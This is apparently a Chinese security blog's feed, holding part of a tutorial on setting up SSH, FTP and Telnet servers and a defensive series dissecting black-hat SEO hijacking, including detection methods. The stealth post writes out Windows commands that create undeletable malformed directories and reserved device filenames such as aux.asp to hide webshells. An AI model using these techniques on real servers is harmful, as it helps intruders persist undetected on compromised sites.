<p>服务端导入客户端的公钥：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat test.pub &gt;&gt; .ssh/authorized_keys</div></pre></td></tr></table></figure></p>
<p>修改权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 700 .ssh</div></pre></td></tr></table></figure></p>
<p>客户端可通过私钥文件去登录，而不需要密码登录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ssh -i ~/.ssh/<span class="built_in">test</span> 10.0.0.1</div></pre></td></tr></table></figure></p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h4 id="服务端安装-1"><a href="#服务端安装-1" class="headerlink" title="服务端安装"></a>服务端安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install vsftpd</div><div class="line"></div><div class="line">yum install vsftpd</div></pre></td></tr></table></figure>
<p>启动服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo service vsftpd start</div></pre></td></tr></table></figure></p>
<h4 id="服务端配置-1"><a href="#服务端配置-1" class="headerlink" title="服务端配置"></a>服务端配置</h4><p>FTP服务端配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/vsftpd/vsftpd.conf <span class="comment">#配置文件</span></div></pre></td></tr></table></figure></p>
<p>配置文件内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line">anonymous_enable=YES</div><div class="line">允许匿名用户登录</div><div class="line"></div><div class="line">local_enable=YES</div><div class="line">允许系统用户名登录</div><div class="line"></div><div class="line">write_enable=YES</div><div class="line">允许使用任何可以修改文件系统的FTP的指令</div><div class="line"></div><div class="line">local_umask=022</div><div class="line">本地用户新增档案的权限</div><div class="line"></div><div class="line"><span class="comment">#anon_upload_enable=YES</span></div><div class="line">允许匿名用户上传文件</div><div class="line"></div><div class="line"><span class="comment">#anon_mkdir_write_enable=YES</span></div><div class="line">允许匿名用户创建新目录</div><div class="line"></div><div class="line">dirmessage_enable=YES</div><div class="line">允许为目录配置显示信息,显示每个目录下面的message_file文件的内容</div><div class="line"></div><div class="line">xferlog_enable=YES</div><div class="line">开启日记功能 </div><div class="line"></div><div class="line">connect_from_port_20=YES</div><div class="line">使用标准的20端口来连接ftp </div><div class="line"></div><div class="line"><span class="comment">#chown_uploads=YES</span></div><div class="line">所有匿名上传的文件的所属用户将会被更改成chown_username</div><div class="line"></div><div class="line"><span class="comment">#chown_username=whoever</span></div><div class="line">匿名上传文件所属用户名 </div><div class="line"></div><div class="line"><span class="comment">#xferlog_file=/var/log/vsftpd.log</span></div><div class="line">日志文件位置 </div><div class="line"></div><div class="line">xferlog_std_format=YES</div><div class="line">使用标准格式 </div><div class="line"></div><div class="line"><span class="comment">#idle_session_timeout=600</span></div><div class="line">空闲连接超时 </div><div class="line"></div><div class="line"><span class="comment">#data_connection_timeout=120</span></div><div class="line">数据传输超时 </div><div class="line"></div><div class="line"><span class="comment">#nopriv_user=ftpsecure</span></div><div class="line">当服务器运行于最底层时使用的用户名 </div><div class="line"></div><div class="line"><span class="comment">#async_abor_enable=YES</span></div><div class="line">允许使用\<span class="string">"async ABOR\"命令,一般不用,容易出问题 </span></div><div class="line"></div><div class="line">#ascii_upload_enable=YES</div><div class="line">管控是否可用ASCII 模式上传。默认值为NO</div><div class="line">#ascii_download_enable=YES</div><div class="line">管控是否可用ASCII 模式下载。默认值为NO</div><div class="line"></div><div class="line">#ftpd_banner=Welcome to blah FTP service. </div><div class="line">login时显示欢迎信息.如果设置了banner_file则此设置无效 </div><div class="line"></div><div class="line">#deny_email_enable=YES</div><div class="line">如果匿名用户需要密码,那么使用banned_email_file里面的电子邮件地址的用户不能登录</div><div class="line"></div><div class="line">#banned_email_file=/etc/vsftpd/banned_emails</div><div class="line">禁止使用匿名用户登陆时作为密码的电子邮件地址 </div><div class="line"></div><div class="line">#chroot_list_enable=YES</div><div class="line">如果启动这项功能，则所有列在chroot_list_file中的使用者不能更改根目录 </div><div class="line"></div><div class="line">#chroot_list_file=/etc/vsftpd/chroot_list</div><div class="line">定义不能更改用户主目录的文件 </div><div class="line"></div><div class="line">#ls_recurse_enable=YES   </div><div class="line">是否能使用ls -R命令以防止浪费大量的服务器资源 </div><div class="line"></div><div class="line">listen=YES </div><div class="line">绑定到listen_port指定的端口,既然都绑定了也就是每时都开着的,就是那个什么</div><div class="line">standalone模式 </div><div class="line"></div><div class="line">pam_service_name=vsftpd  </div><div class="line">定义PAM 所使用的名称，预设为vsftpd</div><div class="line"></div><div class="line">userlist_enable=YES </div><div class="line">若启用此选项,userlist_deny选项才被启动 </div><div class="line"></div><div class="line">tcp_wrappers=YES </div><div class="line">开启tcp_wrappers支持</div></pre></td></tr></table></figure></p>
<h4 id="客户端使用-1"><a href="#客户端使用-1" class="headerlink" title="客户端使用"></a>客户端使用</h4><p>ftp连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ftp root@10.0.0.1</div><div class="line">ftp 10.0.0.1</div><div class="line">ftp 10.0.0.1 21</div></pre></td></tr></table></figure></p>
<h3 id="TELNET"><a href="#TELNET" class="headerlink" title="TELNET"></a>TELNET</h3><h4 id="服务端安装-2"><a href="#服务端安装-2" class="headerlink" title="服务端安装"></a>服务端安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install xinetd telnet telnet-server</div></pre></td></tr></table></figure>
<p>开启telnet服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">systemctl <span class="built_in">enable</span> telnet.socket  </div><div class="line">systemctl start telnet.socket  </div><div class="line">systemctl <span class="built_in">enable</span> xinetd  </div><div class="line">systemctl start xinetd</div></pre></td></tr></table></figure></p>
<h4 id="服务端配置-2"><a href="#服务端配置-2" class="headerlink" title="服务端配置"></a>服务端配置</h4><p>编辑：/etc/xinetd.d/telnet文件</p>
<p>要允许通过xinetd联接telnet，需要编辑/etc/xinetd.d/telnet文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/xinetd.d/telnet</div></pre></td></tr></table></figure></p>
<p>将’disable’的值从’yes’修改为’no’。</p>
<p>要允许telnet从其他机子联接到本机，需要添加允许规则:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim/etc/hosts.allow</div><div class="line">添加如下行：</div><div class="line">in.telnetd: ALL</div></pre></td></tr></table></figure></p>
<p>如果需要开机自动开启该服务，将xinetd加入到/etc/rc.conf的”DAEMONS”中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DAEMONS=(syslog-ng network netfs crond ............ xinetd)</div></pre></td></tr></table></figure></p>
<p>说明：centos7下面安装telnet 没有生成 /etc/xinetd.d/telnet 文件。</p>
<h4 id="客户端使用-2"><a href="#客户端使用-2" class="headerlink" title="客户端使用"></a>客户端使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">telnet 10.0.0.1 [port]</div><div class="line">&gt;&gt;输入账号密码即可</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;爱你的每个瞬间像飞驰而过的地铁&lt;/blockquote&gt;&lt;br&gt;　　ssh、telnet、ftp相信大家都很熟悉，它们是linux中最常用的几个服务。一般linux系统缺省是安装了ssh、ftp、telnet的，但也有些情况是没有安装的。本篇主要记录如何在linux上搭建这几个服务，并简单记录对应服务的客户端使用方法。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="ssh" scheme="http://thief.one/tags/ssh/"/>
    
      <category term="telnet" scheme="http://thief.one/tags/telnet/"/>
    
      <category term="ftp" scheme="http://thief.one/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>黑帽SEO剖析之总结篇</title>
    <link href="http://thief.one/2017/09/28/4/"/>
    <id>http://thief.one/2017/09/28/4/</id>
    <published>2017-09-28T07:28:19.000Z</published>
    <updated>2017-09-28T09:22:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">视而不见，谓合道於希夷；挹之则盈，方同功於造化</blockquote><br>　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为总结篇，主要介绍黑帽seo行为的检测以及预防。可以说此系列前面三篇文章，是为最后一篇做的铺垫，毕竟作为安全工程师我们真正需要做的，是帮助客户去防御攻击，抵御黑产。<br><a id="more"></a></p>
<h3 id="如何检测自身网站是否被劫持？"><a href="#如何检测自身网站是否被劫持？" class="headerlink" title="如何检测自身网站是否被劫持？"></a>如何检测自身网站是否被劫持？</h3><p>　　前面介绍了很多关于黑帽seo的手法，那作为站长或者运维该怎么去监控自身网站是否被入侵，且被黑帽seo利用了呢？这里不说如何检测入侵，因为这不是本文的范畴，我们只谈如何检测被黑帽seo利用，这里提供几个思路。</p>
<h4 id="内部监控"><a href="#内部监控" class="headerlink" title="内部监控"></a>内部监控</h4><p>　　可以监控服务器web目录下的文件改动情况，一般黑帽seo都需要改动web目录下的文件（新增文件，或更改文件内容）。当然有些只改变nginx配置就可以达到目的，因此nginx等服务器的配置文件也需要进行监控。</p>
<p>小结：内部监控比较类似防篡改的检测，只是面对网页劫持，除了响应文件内容改动以外，还需要响应新增文件等行为，包括服务器配置文件的改动。</p>
<h4 id="外部检测"><a href="#外部检测" class="headerlink" title="外部检测"></a>外部检测</h4><p>　　黑帽seo手法从根本上是欺骗搜索引擎，因此检测本质上也可以从搜索引擎出发。检测网站在搜索引擎搜索显示下是否出现了敏感的内容，比如：博彩、色情等。由于网页劫持手法可以动态调控显示内容，比如不同地区点击返回不同的内容等，因此这需要我们的检测程序能够多维度得进行检测。</p>
<p>多维度包括但不局限于以下几种：</p>
<ul>
<li>采用不同地区的IP检测目标网站</li>
<li>采用不同时间段内检测目标网站</li>
<li>采用不同的UA访问目标网站</li>
<li>采用不同的访问方式目标网站（百度搜索跳转、直接访问域名）</li>
</ul>
<p>检测步骤分为：</p>
<ul>
<li>获取搜索引擎搜索结果</li>
<li>模拟浏览器访问搜索结果网页</li>
<li>解析网页源码等元素</li>
<li>匹配规则判断网站是否被劫持</li>
</ul>
<h5 id="获取搜索引擎搜索结果"><a href="#获取搜索引擎搜索结果" class="headerlink" title="获取搜索引擎搜索结果"></a>获取搜索引擎搜索结果</h5><p>　　这一步骤需要爬取搜索引擎，比如我们要判断thief.one网站是否被劫持，可以搜索百度：site:thief.one 色情。关键词需要自己搜集，然后利用爬虫爬取百度的搜索结果。<br>　　显然这一步需要对抗百度搜索引擎，防止被其屏蔽问题，还要能够正确的获取百度的搜索结果。关于爬起搜索引擎可参考：<br><a href="https://thief.one/2017/03/17/%E7%88%AC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E5%AF%BB%E4%BD%A0%E5%8D%83%E7%99%BE%E5%BA%A6/">爬取搜索引擎之寻你千百度</a><br><a href="https://thief.one/2017/03/19/%E7%88%AC%E5%8F%96%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E6%90%9C%E7%8B%97/">爬取搜索引擎之搜狗</a></p>
<h5 id="模拟浏览器访问搜索结果网页"><a href="#模拟浏览器访问搜索结果网页" class="headerlink" title="模拟浏览器访问搜索结果网页"></a>模拟浏览器访问搜索结果网页</h5><p>　　当爬到所需要的网页链接后，我们需要重放url获取信息。这一步需要能够动态执行网页中嵌入的js代码，动态跟踪网页的走向（跳转）。这里推荐使用<a href="http://thief.one/2017/03/31/Phantomjs%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/_">phantomjs</a>当然也可以使用其他webkit。</p>
<h5 id="解析网页源码等元素"><a href="#解析网页源码等元素" class="headerlink" title="解析网页源码等元素"></a>解析网页源码等元素</h5><p>　　可以利用python解析网页源码、网页标题、URL、js等内容，最方便的做法是获取各个参数的内容，处理数据打标后扔到机器学习的算法中进行模型计算。
　　</p>
<h5 id="匹配规则判断网站是否被劫持"><a href="#匹配规则判断网站是否被劫持" class="headerlink" title="匹配规则判断网站是否被劫持"></a>匹配规则判断网站是否被劫持</h5><p>　　可以使用正则等方式，根据黑帽seo等特征建立规则库去匹配。当然也可以利用机器学习的方式去对相关网页进行分类，我们曾经使用过某种算法，将准确率提高到了90%左右。</p>
<p>小结：外部检测难度比较大，目前黑帽seo主要针对百度，因此这相当于去检测百度的搜索结果；而如何模拟浏览器访问也是一大难题，当然最重要的是最后的机器学习，如何训练模型。</p>
<h3 id="谁来为此买单？"><a href="#谁来为此买单？" class="headerlink" title="谁来为此买单？"></a>谁来为此买单？</h3><p>　　基于黑帽SEO大多数都为博彩赌博行业做推广，将会增加网民沉迷网络赌博的风险，纵观身边因为网络赌博而家破人亡的事情不在少数；而也有一部分黑帽SEO在为枪支弹药、毒品违禁药物做推广，更是为犯罪分子提供了便利。在此之前，我一直认为黑产只是暴利并无太大危害，然而通过对黑帽SEO的研究发现，其危害的绝不仅仅只是经济而已。那么这一切，应该由谁来买单？<br>　　首先网站管理者难辞其咎，正因为管理员安全意识的淡薄，网站安全性不高，导致被入侵最终成为黑产的一部分。在我自身处理的几起类似事件中，网站管理员往往是一副无关紧要的态度，即使网站已经被黑帽SEO利用，也觉得没有对网站本身造成什么危害，觉悟性不高。<br>　　其次搜索引擎应该担负一定的责任，因为黑帽SEO行为主要针对搜索引擎，说白了就是利用搜索引擎算法漏洞，提升非法网站权重。国内大多数网民上网都使用搜索引擎。搜索引擎既然有权利决定显示哪些资源给用户，那么也必须有义务确保这些资源的安全性、正规性。</p>
<h3 id="如何制止与防御？"><a href="#如何制止与防御？" class="headerlink" title="如何制止与防御？"></a>如何制止与防御？</h3><p>如果您是网民，制止黑帽seo最好的方式就是科学上网，发现非法网站及时提交到<a href="https://www.anquan.org/" target="_blank" rel="external">安全联盟</a>或向搜索引擎举报。<br>如果您是网站管理员，请做好自身网站的安全建设，及时补漏；若已发现被入侵，及时联系技术人员处理。</p>
<h3 id="谈谈心"><a href="#谈谈心" class="headerlink" title="谈谈心"></a>谈谈心</h3><p>　　当在写这篇文章前，我思索着尽量能够全面地介绍黑帽SEO知识以及手法。当开始写这篇文章的时候，我便有点无从下手，因为涉及知识面太广，手法又非常丰富，我研究黑帽SEO不久了解也不算深入。而当我写完这篇文章的时候，我觉得这一切才刚刚开始，也许我此刻抒写的正是黑客几年前或十几年前所用或者所流行的技术。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/09/28/4/">黑帽SEO剖析之总结篇</a><br><a href="https://thief.one/2017/09/28/3/">黑帽SEO剖析之隐身篇</a><br><a href="https://thief.one/2017/09/28/2/">黑帽SEO剖析之工具篇</a><br><a href="https://thief.one/2017/09/28/1/">黑帽SEO剖析之手法篇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;视而不见，谓合道於希夷；挹之则盈，方同功於造化&lt;/blockquote&gt;&lt;br&gt;　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为总结篇，主要介绍黑帽seo行为的检测以及预防。可以说此系列前面三篇文章，是为最后一篇做的铺垫，毕竟作为安全工程师我们真正需要做的，是帮助客户去防御攻击，抵御黑产。&lt;br&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="http://thief.one/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑帽seo" scheme="http://thief.one/tags/%E9%BB%91%E5%B8%BDseo/"/>
    
  </entry>
  
  <entry>
    <title>黑帽SEO剖析之隐身篇</title>
    <link href="http://thief.one/2017/09/28/3/"/>
    <id>http://thief.one/2017/09/28/3/</id>
    <published>2017-09-28T07:27:27.000Z</published>
    <updated>2017-09-28T09:22:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">视而不见，谓合道於希夷；挹之则盈，方同功於造化</blockquote><br>　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为隐身篇，主要介绍黑帽seo中一些隐身的手段。黑帽seo与其他黑产行为不同的是，它需要时间去创造价值。如果是倒卖数据，只需要入侵服务器脱裤走人，而黑帽seo需要潜伏在服务器上一段时间，因为它主要靠引流来创造价值。那么如何做到不被服务器运维发现就至关重要了，也是黑帽seo行为是否能最终成功的关键。<br><a id="more"></a></p>
<h3 id="隐身的技术"><a href="#隐身的技术" class="headerlink" title="隐身的技术"></a>隐身的技术</h3><p>　　在处理的一些入侵应急响应事件中，我们发现有些网站被挂恶意页面达数月甚至数年之久，而在此期间管理员竟然毫无察觉。有时这并非是管理员的粗心大意，而是黑客过于狡猾。在了解了我之前所介绍的网页劫持手段后，我想你大概能了解这其中的缘由了，网页劫持能控制跳转控制页面呈现的内容，这便是难以被管理员发现的主要原因。除此之外，寄生虫程序能够自动生成网页也使得其生存能力很强，不易被根除。其次我们在发现网站被挂恶意网页后，通常会登录服务器进行查看，而有时我们很难找到被非法篡改或者被恶意植入的脚本文件，因为此类型文件被黑客精心地隐藏了起来。那么除了上述手段之外，黑客还有哪些手段来隐藏自身，使之生生不灭？</p>
<h4 id="网页劫持控制跳转"><a href="#网页劫持控制跳转" class="headerlink" title="网页劫持控制跳转"></a>网页劫持控制跳转</h4><p>网页劫持中的控制跳转就是为了隐藏网站已被入侵的事实，让网站管理员不容易发现。</p>
<h4 id="nginx二级目录反向代理技术"><a href="#nginx二级目录反向代理技术" class="headerlink" title="nginx二级目录反向代理技术"></a>nginx二级目录反向代理技术</h4><p>　　通过配置nginx/apache等中间件配置文件设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。即浏览者在打开thief.one/2016/目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据）。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除也不易被发现。</p>
<h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><p>　　给文件设置属性隐藏。我曾经遇到过此类事件，当时我们一个技术人员通过肉眼选择了服务器上一批web目录下的文件进行copy。而当我们对这些文件进行扫描时，并未发现任何异常，一切都变得匪夷所思。而最后的结果让我们哭笑不得，原来恶意文件被设置成了属性隐藏，通过肉眼观察的技术人员并没有将此文件copy下来，因此这也算是一种有效的障眼法。</p>
<h4 id="不死文件"><a href="#不死文件" class="headerlink" title="不死文件"></a>不死文件</h4><p>不死文件指的是删除不了的webshell或者是非法页面文件（.html或者动态文件），此类事件在实际中没有遇到过，但理论上确实可行。</p>
<h5 id="设置畸形目录"><a href="#设置畸形目录" class="headerlink" title="设置畸形目录"></a>设置畸形目录</h5><p>目录名中存在一个或多个. (点、英文句号)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md a..\</div></pre></td></tr></table></figure></p>
<p>该目录无法被手工删除，当然命令行可以删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rd /s /q a..\</div></pre></td></tr></table></figure></p>
<h5 id="特殊文件名"><a href="#特殊文件名" class="headerlink" title="特殊文件名"></a>特殊文件名</h5><p>其实是系统设备名，这是Windows 系统保留的文件名，普通方法无法访问，主要有：lpt,aux,com1-9,prn,nul,con，例如：lpt.txt、com1.txt 、aux.txt，aux.pasp，aux.php等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> hello&gt;\\.\c:\a..\aux.txt</div></pre></td></tr></table></figure></p>
<h5 id="畸形目录-特殊文件名"><a href="#畸形目录-特殊文件名" class="headerlink" title="畸形目录+特殊文件名"></a>畸形目录+特殊文件名</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">md c:\a..\</div><div class="line"><span class="built_in">echo</span> hello&gt;\\.\c:\a..\aux.asp    <span class="comment">#注意：这里的路径要写绝对路径（上传的aux.php木马可以被执行）</span></div></pre></td></tr></table></figure>
<p>删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rd /s /q \\.\c:\a..\</div></pre></td></tr></table></figure></p>
<p>方法还有很多，不一一列举了。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/09/28/4/">黑帽SEO剖析之总结篇</a><br><a href="https://thief.one/2017/09/28/3/">黑帽SEO剖析之隐身篇</a><br><a href="https://thief.one/2017/09/28/2/">黑帽SEO剖析之工具篇</a><br><a href="https://thief.one/2017/09/28/1/">黑帽SEO剖析之手法篇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;视而不见，谓合道於希夷；挹之则盈，方同功於造化&lt;/blockquote&gt;&lt;br&gt;　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为隐身篇，主要介绍黑帽seo中一些隐身的手段。黑帽seo与其他黑产行为不同的是，它需要时间去创造价值。如果是倒卖数据，只需要入侵服务器脱裤走人，而黑帽seo需要潜伏在服务器上一段时间，因为它主要靠引流来创造价值。那么如何做到不被服务器运维发现就至关重要了，也是黑帽seo行为是否能最终成功的关键。&lt;br&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="http://thief.one/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑帽seo" scheme="http://thief.one/tags/%E9%BB%91%E5%B8%BDseo/"/>
    
  </entry>
  
  <entry>
    <title>黑帽SEO剖析之工具篇</title>
    <link href="http://thief.one/2017/09/28/2/"/>
    <id>http://thief.one/2017/09/28/2/</id>
    <published>2017-09-28T07:25:39.000Z</published>
    <updated>2017-09-28T09:22:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">视而不见，谓合道於希夷；挹之则盈，方同功於造化</blockquote><br>　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为工具篇，主要介绍黑帽seo中经常使用到的一些工具，及其用途。<br>　　搞黑帽SEO往往都是批量操作，因此自动化工具不可或缺，也是整个黑产环中比较重要的一环。本篇将会介绍几款黑帽seo中常用的工具，由于本篇写于一年前，因此部分工具可能已淘汰或者升级。<br><a id="more"></a></p>
<h3 id="寄生虫（jsc"><a href="#寄生虫（jsc" class="headerlink" title="寄生虫（jsc)"></a>寄生虫（jsc)</h3><p>　　植入寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。简单来说，寄生虫是一种程序，此程序的功能是能够自己创建网页文件，而创建的条件可以定制，比如说当有人访问某个页面时就会触发寄生虫程序生成一批新的网页文件，或者每天定时创建等等。<br>　　我曾经在给一个客户处理应急响应事件时，便遇到过此类状况。每当我清理完所有恶意网页文件后，服务器上都会不时地自动生成一大批新的网页文件。令人头疼的是，当时我完全掌握不了生成新文件的规律。后来我们在一一排除web服务器上的文件时，发现了其中一个恶意的动态语言文件（由于种种原因，样本没有保留下来），此恶意文件就是类似寄生虫程序，会在我们访问此网站的某个页面触发，生成一批新的恶意页面。</p>
<h4 id="寄生虫分类"><a href="#寄生虫分类" class="headerlink" title="寄生虫分类"></a>寄生虫分类</h4><p>　　寄生虫分为动态与静态，动态寄生虫程序的就是会不断自动生成新的页面（如我上面所述案例），或者是刷新页面以后自动变化内容，动态寄生虫生成的恶意文件往往是asp/php后缀文件；而静态寄生虫程序生成的页面往往都是固定不变的内容，大多为html后缀文件。</p>
<h4 id="寄生虫模板"><a href="#寄生虫模板" class="headerlink" title="寄生虫模板"></a>寄生虫模板</h4><p>　　寄生虫程序生成的页面往往都是有固定模板的，模板的好坏有时也决定了是否能够被搜索引擎快速收录，以下是我收集的两种寄生虫程序生成的模板页面。<br>寄生虫模板案例一：<br><img src="/upload_image/20170515/18.png" alt=""><br>寄生虫模板案例二：<br><img src="/upload_image/20170515/19.png" alt=""></p>
<h4 id="静态寄生虫挂二级目录案例"><a href="#静态寄生虫挂二级目录案例" class="headerlink" title="静态寄生虫挂二级目录案例"></a>静态寄生虫挂二级目录案例</h4><p>案例来自去年处理的一起入侵检测事件，我们发现目标网站上被挂了非法推广页面，如下图所示：<br><img src="/upload_image/20170515/26.png" alt=""><br>通过登录web服务器查看，我们发现了网站根目录下多了一个二级目录ds，而ds目录内放满了html文件，都是通过寄生虫生成的。（由于时间久远，html样本文件已丢失）<br><img src="/upload_image/20170515/25.png" alt=""><br>通过登录服务器日志分析，我们最终发现黑客是通过web应用程序漏洞获取到了服务器权限，并在该服务器上利用静态寄生虫程序创建了大量恶意的html后缀文件，并存放在ds目录下，其利用的便是高权重网站二级目录手法。</p>
<p>　　以上占用大量篇幅介绍了很多黑帽seo的手法，也介绍了寄生虫程序这一自动生成网页文件的利器。那么黑帽seo是如何让这些非法页面快速被搜索引擎收录的呢？我们知道如果这些恶意推广的页面无法被搜索引擎收录，那么黑帽SEO就达不到预期的效果。起初在研究黑帽seo时我也一直在思考这个问题，按常理搜索引擎不应该会收录具有恶意内容的推广页面，而事实是目前我们随便在百度上搜<em>site:.gov.cn 博彩</em>或者<em>site:.edu.cn 色情</em>，就会出现一大批被挂上博彩色情的政府教育机构网站。显然这些页面目前还是能够很好地被搜索引擎收录，甚至能很快被收录，我曾经发现过几分钟内被收录的恶意页面。那么是搜索引擎故意为之，还是有人利用了搜索引擎的某些特征或者说漏洞？要理解这个问题，我想必须得介绍一下黑帽SEO又一大利器—蜘蛛池。</p>
<h3 id="蜘蛛池"><a href="#蜘蛛池" class="headerlink" title="蜘蛛池"></a>蜘蛛池</h3><p>　　蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。简单来说就是通过购买大量域名，租用大量服务器，批量搭建网站形成站群。而这些网站彼此之间形成链轮，网站内容大多为超链接，或者一些动态的新闻内容等。经过一段时间的运营，此站群每天就能吸引一定量的搜索引擎蜘蛛，蜘蛛的多少要看网站内容搭建的好坏以及域名的个数。当蜘蛛数量达到一个量级且稳定以后，就可以往里面添加想要推广的网页，比如通过黑帽SEO手段创建的非法页面。这一过程就好比在一个高权重网站上添加友情链接，会达到快速收录的目的。</p>
<h4 id="蜘蛛池交易平台"><a href="#蜘蛛池交易平台" class="headerlink" title="蜘蛛池交易平台"></a>蜘蛛池交易平台</h4><p>　　我随便百度了一下，发现互联网上存在很多蜘蛛池交易平台，即可通过互联网上的蜘蛛池推广恶意网页。这种方式省去了自己搭建蜘蛛池的麻烦，却也为黑帽seo人员提供了便利。在收集资料时，我挑选了其中一个交易平台，截图如下：<br><img src="/upload_image/20170515/11.png" alt=""></p>
